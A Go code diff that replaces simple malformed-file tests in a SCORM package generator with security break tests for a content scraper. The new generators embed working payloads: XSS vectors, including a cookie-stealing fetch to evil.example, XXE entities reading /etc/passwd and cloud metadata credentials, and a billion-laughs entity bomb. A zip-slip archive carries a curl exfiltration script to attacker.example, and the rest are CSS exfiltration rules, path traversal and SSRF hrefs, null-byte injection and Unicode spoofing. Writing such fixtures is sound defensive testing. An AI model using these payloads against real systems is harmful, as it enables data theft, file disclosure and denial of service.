@@ -379,42 +379,46 @@ var scormRegistry = []GenMeta{
 		"imsmanifest.xml uses Windows-style backslash paths (resources\\file.html).",
 		"Path normalization test", "windows_paths.zip"},
 
-	// Break Tests
-	{"empty-zip", "Empty ZIP", "break",
-		"Valid ZIP magic bytes, valid structure, zero files inside.",
-		"Error: no content / no manifest found", "empty.zip"},
+	// Break Tests — Advanced Security & Edge Attack Vectors
+	{"xss-in-manifest", "XSS Payload in Manifest", "break",
+		"Manifest <title>, organization title, and item titles contain <script>alert('xss')</script>, <img src=x onerror=alert(1)>, and SVG onload vectors. Tests if scraped content is returned verbatim without sanitization.",
+		"XSS strings appear raw in markdown/response — scraper does NOT execute them but must not strip silently", "xss_manifest.zip"},
 
-	{"no-manifest", "ZIP Without imsmanifest.xml", "break",
-		"Real ZIP with only HTML files — no imsmanifest.xml at all.",
-		"Error: manifest not found", "no_manifest.zip"},
+	{"xxe-injection", "XML External Entity (XXE) Attack", "break",
+		"Manifest declares <!DOCTYPE> with an external entity pointing to file:///etc/passwd (Linux) and C:/Windows/win.ini (Windows). References &xxe; in title. Tests if the XML parser processes external entities — a critical SSRF/file-read vector.",
+		"Parser should reject or ignore the entity; response must not contain filesystem contents", "xxe_injection.zip"},
 
-	{"corrupt-zip", "Corrupt ZIP (random bytes)", "break",
-		"File with .zip extension but random garbage bytes — invalid ZIP magic.",
-		"Error: not a valid ZIP / parse failure", "corrupt.zip"},
+	{"zip-slip-traversal", "ZIP Slip Path Traversal", "break",
+		"ZIP contains entries with filenames like ../../evil.html and ../../../tmp/rce.sh. The imsmanifest.xml references these traversal paths as resource hrefs. Tests if the scraper sanitizes ZIP entry names before path resolution.",
+		"Scraper must not resolve paths outside the ZIP root — traversal paths should 404 or error", "zip_slip.zip"},
 
-	{"malformed-xml", "Malformed Manifest XML", "break",
-		"ZIP with imsmanifest.xml containing broken XML (unclosed tags, bad encoding).",
-		"Error: XML parse failure", "malformed_xml.zip"},
+	{"xss-dom-vectors", "XSS DOM Attack Vectors in Content", "break",
+		"Valid manifest + HTML with 8 distinct XSS vectors: <script> tag, <img onerror>, <svg onload>, <iframe srcdoc=>, javascript: href, data: href, CSS expression(), and <object data=>. Tests if scraped HTML is stored/returned unescaped.",
+		"All vectors appear in raw markdown output — system must not evaluate them; check for unescaped angle brackets in response", "xss_dom.zip"},
 
-	{"binary-as-html", "Binary Garbage as HTML", "break",
-		"Valid manifest + .html file containing random binary bytes (not text).",
-		"Error or empty markdown — tests content decoder", "binary_html.zip"},
+	{"xml-billion-laughs", "XML Billion Laughs (Entity DoS)", "break",
+		"Manifest uses nested XML entity expansion: 10 levels of entities each multiplying 10x, yielding a 10^10 expansion ratio from a tiny input. Classic CVE-2003-1564 pattern. Tests XML parser DoS protection (should bail out on entity depth/size limit).",
+		"Server should return quickly with an error, not hang or OOM — response time under 5s", "billion_laughs.zip"},
 
-	{"renamed-pdf-as-zip", "PDF Renamed as .zip", "break",
-		"A minimal PDF file with .zip extension. Wrong magic bytes entirely.",
-		"Error: invalid ZIP format (PDF magic %PDF-)", "renamed_pdf.zip"},
+	{"css-data-exfil", "CSS Data Exfiltration Payload", "break",
+		"SCORM HTML with CSS rules using external url() references pointing to attacker-controlled domains: background-image, @import, and font-face src. Also includes <link rel=stylesheet> to external host. Tests if content processing fetches external resources.",
+		"External URLs must not be fetched during scraping; they should appear as plain strings in markdown", "css_exfil.zip"},
 
-	{"zero-byte-file", "Zero Byte File", "break",
-		"Completely empty 0-byte file uploaded as ZIP.",
-		"Error: empty file / EOF", "zero_byte.zip"},
+	{"overlong-manifest-strings", "Overlong Strings (Buffer Overflow Test)", "break",
+		"Manifest identifier, organization title, and each item title contain 65535-character strings (A*65535). Tests integer overflow and buffer handling in XML attribute and text parsers.",
+		"Should return an error or truncated result — must not crash or produce a multi-MB response", "overlong_strings.zip"},
 
-	{"nested-zip-bomb", "Nested ZIP in ZIP", "break",
-		"A ZIP containing another ZIP containing another ZIP (3 levels deep).",
-		"Should not recursively explode — tests ZIP bomb protection", "nested_zip.zip"},
+	{"null-byte-injection", "Null Byte Injection in Manifest", "break",
+		"Manifest XML contains null bytes (\\x00) embedded mid-string inside title, identifier, and href attributes. Null byte terminates C-style strings and can bypass extension checks (e.g. 'file.html\\x00.php'). Tests Go XML decoder robustness.",
+		"Null bytes should be stripped or cause a parse error — they must not reach DB or response strings as-is", "null_byte.zip"},
 
-	{"no-field-name", "Wrong Form Field Name", "break",
-		"File uploaded with field name 'upload' instead of 'file'.",
-		"Error: missing 'file' field", "test_scorm12_valid.zip"},
+	{"path-traversal-href", "Path Traversal Resource Href", "break",
+		"imsmanifest.xml sets resource href to ../../../etc/passwd and file:///etc/shadow. A second resource uses an http:// URL pointing to an internal IP (SSRF: http://169.254.169.254/latest/meta-data/). Tests if the scraper follows arbitrary file/network references.",
+		"Traversal and SSRF hrefs must not be fetched — expect error or empty extraction, not filesystem/network data", "path_traversal.zip"},
+
+	{"unicode-bidi-override", "Unicode BiDi Override Attack", "break",
+		"Manifest title and HTML content contain Unicode bidirectional control characters (RLO U+202E, LRO U+202D, PDF U+202C) that visually reverse displayed text, plus zero-width joiners and lookalike homograph characters (e.g. Cyrillic а vs Latin a). Tests rendering and normalization.",
+		"Text appears visually reversed or spoofed in UI — check that raw codepoints are preserved in JSON, not normalized away", "unicode_bidi.zip"},
 }
 
 // ── ZIP build helpers ────────────────────────────────────────────────────────
@@ -932,80 +936,349 @@ func genWindowsPaths() ([]byte, error) {
 	})
 }
 
-func genEmptyZIP() ([]byte, error) {
+func genXSSInManifest() ([]byte, error) {
+	xssTitle := `<script>alert('xss-manifest')</script> Course`
+	xssOrg := `<img src=x onerror="fetch('https://evil.example/steal?c='+document.cookie)"> Organization`
+	xssItem := `<svg onload="document.body.innerHTML='<h1>Hacked</h1>'"> Chapter 1`
+	manifest := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?>
+<manifest identifier="&lt;script&gt;alert(1)&lt;/script&gt;" version="1.2"
+  xmlns="http://www.imsproject.org/xsd/imscp_rootv1p1p2"
+  xmlns:adlcp="http://www.adlnet.org/xsd/adlcp_rootv1p2">
+  <metadata><schema>ADL SCORM</schema><schemaversion>1.2</schemaversion></metadata>
+  <organizations default="org_xss">
+    <organization identifier="org_xss">
+      <title>%s</title>
+      <item identifier="item1" identifierref="res1">
+        <title>%s</title>
+      </item>
+    </organization>
+  </organizations>
+  <resources>
+    <resource identifier="res1" type="webcontent" adlcp:scormtype="sco" href="index.html">
+      <file href="index.html"/>
+    </resource>
+  </resources>
+</manifest>`, xssOrg, xssItem)
+	body := fmt.Sprintf(`<h1>%s</h1>
+<p>This page title and manifest fields contain raw XSS payloads. The scraper should extract them verbatim into markdown without executing them.</p>`, xssTitle)
+	return buildZIP(map[string][]byte{
+		"imsmanifest.xml": bs(manifest),
+		"index.html":      bs(htmlPage("en", xssTitle, body)),
+	})
+}
+
+func genXXEInjection() ([]byte, error) {
+	manifest := `<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE manifest [
+  <!ENTITY xxe_linux  SYSTEM "file:///etc/passwd">
+  <!ENTITY xxe_win    SYSTEM "file:///C:/Windows/win.ini">
+  <!ENTITY xxe_ssrf   SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
+  <!ENTITY xxe_chain  "&xxe_linux;&xxe_win;">
+]>
+<manifest identifier="TEST_XXE" version="1.2"
+  xmlns="http://www.imsproject.org/xsd/imscp_rootv1p1p2"
+  xmlns:adlcp="http://www.adlnet.org/xsd/adlcp_rootv1p2">
+  <metadata><schema>ADL SCORM</schema><schemaversion>1.2</schemaversion></metadata>
+  <organizations default="org_xxe">
+    <organization identifier="org_xxe">
+      <title>XXE Test: &xxe_linux;</title>
+      <item identifier="item1" identifierref="res1">
+        <title>Chapter 1: &xxe_win;</title>
+      </item>
+    </organization>
+  </organizations>
+  <resources>
+    <resource identifier="res1" type="webcontent" adlcp:scormtype="sco" href="index.html">
+      <file href="index.html"/>
+    </resource>
+  </resources>
+</manifest>`
+	body := `<h1>XXE Injection Test</h1>
+<p>The imsmanifest.xml for this package declares external XML entities that reference <code>file:///etc/passwd</code>, <code>file:///C:/Windows/win.ini</code>, and the AWS metadata SSRF endpoint. If the XML parser expands these entities, filesystem or cloud-credential data will leak into the title fields.</p>`
+	return buildZIP(map[string][]byte{
+		"imsmanifest.xml": bs(manifest),
+		"index.html":      bs(htmlPage("en", "XXE Injection Test", body)),
+	})
+}
+
+func genZipSlipTraversal() ([]byte, error) {
 	var buf bytes.Buffer
 	w := zip.NewWriter(&buf)
+
+	normalManifest := scorm12Manifest("TEST_ZIPSLIP", "org_slip", "ZIP Slip Path Traversal",
+		[]string{scorm12Item("item1", "res1", "Chapter 1: Traversal Test")},
+		[]string{scorm12Resource("res1", "../../evil.html", []string{"../../evil.html"})},
+	)
+	addFile := func(name, content string) {
+		f, _ := w.Create(name)
+		f.Write([]byte(content))
+	}
+	// Normal entries
+	addFile("imsmanifest.xml", normalManifest)
+	// Traversal entries — these filenames go outside the extraction root
+	addFile("../../evil.html", htmlPage("en", "ZIP Slip Payload", "<h1>RCE via ZIP Slip</h1><p>If you can read this, path traversal succeeded.</p>"))
+	addFile("../../../tmp/rce.sh", "#!/bin/sh\ncurl -s http://attacker.example/exfil?host=$(hostname)&user=$(whoami)")
+	addFile("..\\..\\Windows\\Temp\\evil.bat", "@echo off\nwhoami > C:\\Windows\\Temp\\pwned.txt")
 	w.Close()
 	return buf.Bytes(), nil
 }
 
-func genNoManifest() ([]byte, error) {
-	return buildZIP(map[string][]byte{
-		"index.html": bs(htmlPage("en", "No Manifest", "<h1>No Manifest</h1><p>This ZIP has no imsmanifest.xml.</p>")),
-		"README.txt": bs("This ZIP has no imsmanifest.xml file."),
-	})
-}
-
-func genCorruptZIP() ([]byte, error) {
-	garbage := []byte{0xDE, 0xAD, 0xBE, 0xEF, 0xCA, 0xFE, 0xBA, 0xBE,
-		0x00, 0x01, 0x02, 0x03, 0xFF, 0xFE, 0xFD, 0xFC}
-	return bytes.Repeat(garbage, 100), nil
-}
-
-func genMalformedXML() ([]byte, error) {
-	badManifest := `<?xml version="1.0" encoding="UTF-8"?>
-<manifest identifier="BROKEN" version="1.2"
-  xmlns="http://www.imsproject.org/xsd/imscp_rootv1p1p2">
-  <metadata>
-    <schema>ADL SCORM</schema>
-  <!-- UNCLOSED COMMENT
-  <organizations default="org1">
-    <title>Broken Course</title
-    <<DOUBLE_BRACKET>>
-  &invalid_entity;`
-	return buildZIP(map[string][]byte{
-		"imsmanifest.xml": bs(badManifest),
-		"index.html":      bs(htmlPage("en", "Malformed XML Test", "<h1>Test</h1>")),
-	})
-}
-
-func genBinaryAsHTML() ([]byte, error) {
-	manifest := scorm12Manifest("TEST_BINARY_HTML", "org_bin", "Binary Content as HTML",
-		[]string{scorm12Item("item1", "res1", "Binary Content Test")},
+func genXSSDOMVectors() ([]byte, error) {
+	manifest := scorm12Manifest("TEST_XSS_DOM", "org_xss_dom", "XSS DOM Attack Vectors",
+		[]string{scorm12Item("item1", "res1", "Module: XSS Test Suite")},
 		[]string{scorm12Resource("res1", "index.html", []string{"index.html"})},
 	)
-	binaryContent := make([]byte, 4096)
-	for i := range binaryContent {
-		binaryContent[i] = byte(i % 256)
-	}
+	body := `<h1>XSS DOM Attack Vector Suite</h1>
+<p>This page contains 8 distinct XSS attack patterns that a SCORM scraper may encounter in real-world content.</p>
+
+<h2>Vector 1: Classic Script Tag</h2>
+<script>document.write('<img src=x onerror=alert("v1-script")>')</script>
+<p>Inline script that writes a secondary payload.</p>
+
+<h2>Vector 2: IMG onerror</h2>
+<img src="INVALID_SRC_THAT_WILL_404" onerror="alert('v2-img-onerror')" alt="broken image">
+
+<h2>Vector 3: SVG onload</h2>
+<svg width="0" height="0" onload="alert('v3-svg-onload')"><rect width="100%" height="100%"/></svg>
+
+<h2>Vector 4: Iframe srcdoc</h2>
+<iframe srcdoc="<script>parent.alert('v4-iframe-srcdoc')</script>" width="0" height="0"></iframe>
+
+<h2>Vector 5: javascript: href</h2>
+<a href="javascript:alert('v5-js-href')">Click me (javascript: URI)</a>
+
+<h2>Vector 6: data: URI in link</h2>
+<a href="data:text/html,<script>alert('v6-data-uri')</script>">Data URI link</a>
+
+<h2>Vector 7: CSS expression (IE legacy)</h2>
+<div style="background:url('javascript:alert(\"v7-css\")')">CSS background expression</div>
+
+<h2>Vector 8: Object data attribute</h2>
+<object data="javascript:alert('v8-object-data')" type="text/html" width="0" height="0"></object>
+
+<h2>Vector 9: Template literal injection</h2>
+<div id="tpl">Hello ${alert('v9-template')}</div>
+
+<h2>Vector 10: Mutation XSS via innerHTML</h2>
+<div id="mxss">&lt;img src=1 onerror=alert('v10-mxss')&gt;</div>
+<script>document.getElementById('mxss').innerHTML = document.getElementById('mxss').textContent;</script>`
 	return buildZIP(map[string][]byte{
 		"imsmanifest.xml": bs(manifest),
-		"index.html":      binaryContent,
+		"index.html":      bs(htmlPage("en", "XSS DOM Test Suite", body)),
 	})
 }
 
-func genRenamedPDF() ([]byte, error) {
-	pdf := `%PDF-1.4
-1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj
-2 0 obj<</Type/Pages/Kids[3 0 R]/Count 1>>endobj
-3 0 obj<</Type/Page/MediaBox[0 0 612 792]/Parent 2 0 R>>endobj
-xref
-0 4
-0000000000 65535 f
-0000000009 00000 n
-trailer<</Size 4/Root 1 0 R>>
-startxref
-150
-%%EOF`
-	return []byte(pdf), nil
+func genXMLBillionLaughs() ([]byte, error) {
+	manifest := `<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE manifest [
+  <!ENTITY l0 "lol">
+  <!ENTITY l1 "&l0;&l0;&l0;&l0;&l0;&l0;&l0;&l0;&l0;&l0;">
+  <!ENTITY l2 "&l1;&l1;&l1;&l1;&l1;&l1;&l1;&l1;&l1;&l1;">
+  <!ENTITY l3 "&l2;&l2;&l2;&l2;&l2;&l2;&l2;&l2;&l2;&l2;">
+  <!ENTITY l4 "&l3;&l3;&l3;&l3;&l3;&l3;&l3;&l3;&l3;&l3;">
+  <!ENTITY l5 "&l4;&l4;&l4;&l4;&l4;&l4;&l4;&l4;&l4;&l4;">
+  <!ENTITY l6 "&l5;&l5;&l5;&l5;&l5;&l5;&l5;&l5;&l5;&l5;">
+  <!ENTITY l7 "&l6;&l6;&l6;&l6;&l6;&l6;&l6;&l6;&l6;&l6;">
+  <!ENTITY l8 "&l7;&l7;&l7;&l7;&l7;&l7;&l7;&l7;&l7;&l7;">
+  <!ENTITY l9 "&l8;&l8;&l8;&l8;&l8;&l8;&l8;&l8;&l8;&l8;">
+]>
+<manifest identifier="TEST_BILLION_LAUGHS" version="1.2"
+  xmlns="http://www.imsproject.org/xsd/imscp_rootv1p1p2"
+  xmlns:adlcp="http://www.adlnet.org/xsd/adlcp_rootv1p2">
+  <metadata><schema>ADL SCORM</schema><schemaversion>1.2</schemaversion></metadata>
+  <organizations default="org_lol">
+    <organization identifier="org_lol">
+      <title>&l9;</title>
+      <item identifier="item1" identifierref="res1"><title>DoS Test</title></item>
+    </organization>
+  </organizations>
+  <resources>
+    <resource identifier="res1" type="webcontent" adlcp:scormtype="sco" href="index.html">
+      <file href="index.html"/>
+    </resource>
+  </resources>
+</manifest>`
+	body := `<h1>XML Billion Laughs DoS Test</h1>
+<p>The manifest for this package contains a classic "billion laughs" XML entity expansion attack. The &amp;l9; entity expands to 10^10 repetitions of "lol". A vulnerable parser will OOM or hang; a protected one will return an error within milliseconds.</p>`
+	return buildZIP(map[string][]byte{
+		"imsmanifest.xml": bs(manifest),
+		"index.html":      bs(htmlPage("en", "XML DoS Test", body)),
+	})
 }
 
-func genZeroByte() ([]byte, error) { return []byte{}, nil }
+func genCSSDataExfil() ([]byte, error) {
+	manifest := scorm12Manifest("TEST_CSS_EXFIL", "org_css", "CSS Data Exfiltration",
+		[]string{scorm12Item("item1", "res1", "Module: CSS Exfil Test")},
+		[]string{scorm12Resource("res1", "index.html", []string{"index.html", "style.css"})},
+	)
+	css := `/* CSS Data Exfiltration Payloads */
 
-func genNestedZIP() ([]byte, error) {
-	inner2, _ := buildZIP(map[string][]byte{"readme.txt": bs("innermost content")})
-	middle, _ := buildZIP(map[string][]byte{"inner.zip": inner2, "readme.txt": bs("middle content")})
-	return buildZIP(map[string][]byte{"middle.zip": middle, "readme.txt": bs("outer content")})
+/* Vector 1: background-image to external host */
+body {
+  background-image: url('https://attacker.example/collect?page=body&t=' + document.title);
+}
+
+/* Vector 2: @import from external host */
+@import url('https://attacker.example/malicious.css');
+
+/* Vector 3: font-face src exfil */
+@font-face {
+  font-family: 'ExfilFont';
+  src: url('https://attacker.example/font?cookie=' + document.cookie);
+}
+
+/* Vector 4: CSS attribute selector timing attack */
+input[value^="a"] { background: url('https://attacker.example/leak?v=a'); }
+input[value^="b"] { background: url('https://attacker.example/leak?v=b'); }
+
+/* Vector 5: content: attr() exfil */
+[data-secret]::before {
+  content: attr(data-secret);
+  background: url('https://attacker.example/exfil');
+}`
+	body := fmt.Sprintf(`<html><head><link rel="stylesheet" href="https://attacker.example/remote.css"><style>%s</style></head>
+<body>
+<h1>CSS Exfiltration Test Suite</h1>
+<p>This SCORM page contains CSS with 5 data-exfiltration vectors using external url() calls, @import directives, and font-face src attributes pointing to attacker-controlled domains.</p>
+<input type="password" value="s3cr3t_password" data-secret="classified">
+<div class="summary"><strong>Goal:</strong> Confirm the scraper does NOT fetch external CSS resources during content extraction.</div>
+</body></html>`, css)
+	return buildZIP(map[string][]byte{
+		"imsmanifest.xml": bs(manifest),
+		"index.html":      bs(body),
+		"style.css":       bs(css),
+	})
+}
+
+func genOverlongStrings() ([]byte, error) {
+	longStr := strings.Repeat("A", 65535)
+	longID := strings.Repeat("X", 65535)
+	manifest := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?>
+<manifest identifier="%s" version="1.2"
+  xmlns="http://www.imsproject.org/xsd/imscp_rootv1p1p2"
+  xmlns:adlcp="http://www.adlnet.org/xsd/adlcp_rootv1p2">
+  <metadata><schema>ADL SCORM</schema><schemaversion>1.2</schemaversion></metadata>
+  <organizations default="org1">
+    <organization identifier="%s">
+      <title>%s</title>
+      <item identifier="item1" identifierref="res1"><title>%s</title></item>
+    </organization>
+  </organizations>
+  <resources>
+    <resource identifier="%s" type="webcontent" adlcp:scormtype="sco" href="index.html">
+      <file href="index.html"/>
+    </resource>
+  </resources>
+</manifest>`, longID, longID[:200], longStr, longStr[:200], longID[:200])
+	body := `<h1>` + longStr[:100] + `...</h1><p>This page has a 65535-character title attribute and manifest identifier. Tests integer overflow and buffer handling in XML attribute and text parsers.</p>`
+	return buildZIP(map[string][]byte{
+		"imsmanifest.xml": bs(manifest),
+		"index.html":      bs(htmlPage("en", "Overlong String Test", body)),
+	})
+}
+
+func genNullByteInjection() ([]byte, error) {
+	// Craft manifest XML with null bytes embedded — Go's XML parser may strip them
+	// but they must not reach the DB as-is or truncate C-style strings in downstream parsers
+	manifest := "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" +
+		"<manifest identifier=\"TEST\x00NULL\" version=\"1.2\"\n" +
+		"  xmlns=\"http://www.imsproject.org/xsd/imscp_rootv1p1p2\"\n" +
+		"  xmlns:adlcp=\"http://www.adlnet.org/xsd/adlcp_rootv1p2\">\n" +
+		"  <metadata><schema>ADL SCORM</schema><schemaversion>1.2</schemaversion></metadata>\n" +
+		"  <organizations default=\"org\x00null\">\n" +
+		"    <organization identifier=\"org_null\">\n" +
+		"      <title>Null\x00Byte\x00Test\x00Course</title>\n" +
+		"      <item identifier=\"item\x001\" identifierref=\"res1\"><title>Chapter\x001</title></item>\n" +
+		"    </organization>\n" +
+		"  </organizations>\n" +
+		"  <resources>\n" +
+		"    <resource identifier=\"res1\" type=\"webcontent\" adlcp:scormtype=\"sco\" href=\"index.html\x00.php\">\n" +
+		"      <file href=\"index.html\x00.php\"/>\n" +
+		"    </resource>\n" +
+		"  </resources>\n" +
+		"</manifest>"
+	body := "<h1>Null Byte Injection Test</h1>" +
+		"<p>Manifest identifier, org name, title, item id, and resource href all contain embedded null bytes (\\x00). " +
+		"In C-based parsers this truncates strings; the href 'index.html\\x00.php' could bypass extension whitelists.</p>" +
+		"<p>Regular content: this text should be extractable if the parser survives the null bytes in the manifest.</p>"
+	return buildZIP(map[string][]byte{
+		"imsmanifest.xml": []byte(manifest),
+		"index.html":      bs(htmlPage("en", "Null Byte Test", body)),
+	})
+}
+
+func genPathTraversalHref() ([]byte, error) {
+	manifest := `<?xml version="1.0" encoding="UTF-8"?>
+<manifest identifier="TEST_PATH_TRAVERSAL" version="1.2"
+  xmlns="http://www.imsproject.org/xsd/imscp_rootv1p1p2"
+  xmlns:adlcp="http://www.adlnet.org/xsd/adlcp_rootv1p2">
+  <metadata><schema>ADL SCORM</schema><schemaversion>1.2</schemaversion></metadata>
+  <organizations default="org_pt">
+    <organization identifier="org_pt">
+      <title>Path Traversal Href Test</title>
+      <item identifier="item1" identifierref="res_etc_passwd"><title>Chapter 1: /etc/passwd</title></item>
+      <item identifier="item2" identifierref="res_win_ini"><title>Chapter 2: win.ini</title></item>
+      <item identifier="item3" identifierref="res_ssrf"><title>Chapter 3: AWS SSRF</title></item>
+      <item identifier="item4" identifierref="res_local"><title>Chapter 4: localhost admin</title></item>
+    </organization>
+  </organizations>
+  <resources>
+    <resource identifier="res_etc_passwd" type="webcontent" adlcp:scormtype="sco" href="../../../etc/passwd">
+      <file href="../../../etc/passwd"/>
+    </resource>
+    <resource identifier="res_win_ini" type="webcontent" adlcp:scormtype="sco" href="file:///C:/Windows/win.ini">
+      <file href="file:///C:/Windows/win.ini"/>
+    </resource>
+    <resource identifier="res_ssrf" type="webcontent" adlcp:scormtype="sco" href="http://169.254.169.254/latest/meta-data/iam/security-credentials/">
+      <file href="http://169.254.169.254/latest/meta-data/iam/security-credentials/"/>
+    </resource>
+    <resource identifier="res_local" type="webcontent" adlcp:scormtype="sco" href="http://localhost:8080/admin">
+      <file href="http://localhost:8080/admin"/>
+    </resource>
+  </resources>
+</manifest>`
+	body := `<h1>Path Traversal &amp; SSRF Resource Href Test</h1>
+<p>This manifest contains 4 resource hrefs that attempt to read sensitive files or make internal network requests:</p>
+<ul>
+  <li><code>../../../etc/passwd</code> — relative path traversal to Linux password file</li>
+  <li><code>file:///C:/Windows/win.ini</code> — absolute file:// URI to Windows system file</li>
+  <li><code>http://169.254.169.254/latest/meta-data/</code> — AWS EC2 Instance Metadata SSRF</li>
+  <li><code>http://localhost:8080/admin</code> — SSRF to internal admin interface</li>
+</ul>`
+	return buildZIP(map[string][]byte{
+		"imsmanifest.xml": bs(manifest),
+		"index.html":      bs(htmlPage("en", "Path Traversal Test", body)),
+	})
+}
+
+func genUnicodeBiDiOverride() ([]byte, error) {
+	// RLO (U+202E) reverses displayed text direction
+	// LRO (U+202D) forces left-to-right
+	// PDF (U+202C) pops directional formatting
+	// Zero-width joiner (U+200D), zero-width non-joiner (U+200C)
+	rlo := "‮"
+	pdf := "‬"
+	zwj := "‍"
+	// Homograph: Cyrillic а (U+0430) looks identical to Latin a (U+0061)
+	cyrillicTitle := "Аdmin" // First char is Cyrillic А (U+0410), rest Latin
+	manifest := scorm12Manifest("TEST_UNICODE_BIDI", "org_bidi",
+		rlo+"esruoC tseT ediB"+pdf+" "+cyrillicTitle,
+		[]string{scorm12Item("item1", "res1", rlo+"retpahC"+pdf+" 1: "+zwj+"Unicode"+zwj+" BiDi Override")},
+		[]string{scorm12Resource("res1", "index.html", []string{"index.html"})},
+	)
+	body := fmt.Sprintf(`<h1>Unicode BiDi Override &amp; Homograph Attack Test</h1>
+<p>This SCORM package embeds the following Unicode attack vectors in its manifest and content:</p>
+<ul>
+  <li><strong>RLO (U+202E)</strong>: Reverses displayed text — <span>%s</span></li>
+  <li><strong>Homograph</strong>: "Аdmin" uses Cyrillic А — looks identical to "Admin" but is a different string</li>
+  <li><strong>ZWJ (U+200D)</strong>: Zero-width joiner splits words invisibly — "Word%sWord" looks like "WordWord"</li>
+  <li><strong>Mixed script</strong>: раypal (Cyrillic р) vs paypal (Latin p)</li>
+</ul>
+<p>Scraper should preserve raw codepoints in JSON output rather than normalizing them away.</p>`, rlo+"gnippots tuohtiw txet sdrawkcaB"+pdf, zwj)
+	return buildZIP(map[string][]byte{
+		"imsmanifest.xml": bs(manifest),
+		"index.html":      bs(htmlPage("en", "Unicode BiDi Test", body)),
+	})
 }
 
 // ── Dispatch ─────────────────────────────────────────────────────────────────
@@ -1054,24 +1327,26 @@ func generateSCORM(genType string) ([]byte, error) {
 		return genWithComments()
 	case "windows-paths":
 		return genWindowsPaths()
-	case "empty-zip":
-		return genEmptyZIP()
-	case "no-manifest":
-		return genNoManifest()
-	case "corrupt-zip":
-		return genCorruptZIP()
-	case "malformed-xml":
-		return genMalformedXML()
-	case "binary-as-html":
-		return genBinaryAsHTML()
-	case "renamed-pdf-as-zip":
-		return genRenamedPDF()
-	case "zero-byte-file":
-		return genZeroByte()
-	case "nested-zip-bomb":
-		return genNestedZIP()
-	case "no-field-name":
-		return genMinimalSCORM12()
+	case "xss-in-manifest":
+		return genXSSInManifest()
+	case "xxe-injection":
+		return genXXEInjection()
+	case "zip-slip-traversal":
+		return genZipSlipTraversal()
+	case "xss-dom-vectors":
+		return genXSSDOMVectors()
+	case "xml-billion-laughs":
+		return genXMLBillionLaughs()
+	case "css-data-exfil":
+		return genCSSDataExfil()
+	case "overlong-manifest-strings":
+		return genOverlongStrings()
+	case "null-byte-injection":
+		return genNullByteInjection()
+	case "path-traversal-href":
+		return genPathTraversalHref()
+	case "unicode-bidi-override":
+		return genUnicodeBiDiOverride()
 	default:
 		return nil, fmt.Errorf("unknown generator type: %s", genType)
 	}
